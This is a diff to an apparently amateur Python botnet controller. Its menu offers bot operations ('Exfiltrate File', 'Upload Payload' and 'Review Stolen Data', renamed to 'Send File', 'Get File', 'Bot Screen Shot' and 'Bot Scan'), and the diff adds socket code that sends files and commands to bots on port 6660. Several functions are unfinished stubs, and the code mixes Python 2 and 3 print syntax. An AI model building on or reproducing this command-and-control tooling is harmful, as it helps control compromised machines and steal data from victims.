@@ -105,11 +105,10 @@ def menu():
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
     descriptions = ['View bots',
-                    'Add bot',
-                    'Take Screen Shot',
-                    'Exfiltrate File',
-                    'Upload Payload',
-                    'Review Stolen Data',
+                    'Send File',
+                    'Get File',
+                    'Bot Screen Shot',
+                    'Bot Scan',
                     'Exit']
 
     # Prints the number (as num) and function name (as func) from array.
@@ -122,8 +121,10 @@ def menu():
     return choice
 
 
-def send_cmd(cmd, target_host, target_port):
+def send_cmd(cmd, target_host):
     # Sends a command to a bot, invoked from other functions who's end result is pushing a command
+
+    target_port = 6660
 
     # create a socket object
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -135,9 +136,35 @@ def send_cmd(cmd, target_host, target_port):
     client.send(cmd)
 
 
-def handle_cmd(cmd):
+def handle_cmd():
     # TODO MAKE THIS SHIT WORK
     print('')
+
+
+def send_file(the_file):
+    # Handles the sending of files
+
+    target_host = '127.0.0.1'
+    target_port = 6660
+
+    # Create a socket, and connection
+    client = socket.socket()
+    client.connect((target_host, target_port))
+
+    target_file = open(the_file, 'rb')
+    read = target_file.read(1024)
+    print('Sending')
+
+    while read:
+        print('Sending...')
+        client.send(read)
+        read = target_file.read(1024)
+
+    print "Sending Complete"
+    client.shutdown(socket.SHUT_WR)
+    client.close()
+
+
 
 # ---------- END FUNCTIONS ---------- #
 
@@ -208,7 +235,7 @@ while True:
         print('function 4')
         # TODO MAKE THIS WORK
 
-    elif select == 6:  # Exit the Script
+    elif select == 5:  # Exit the Script
         end()
 
     else:
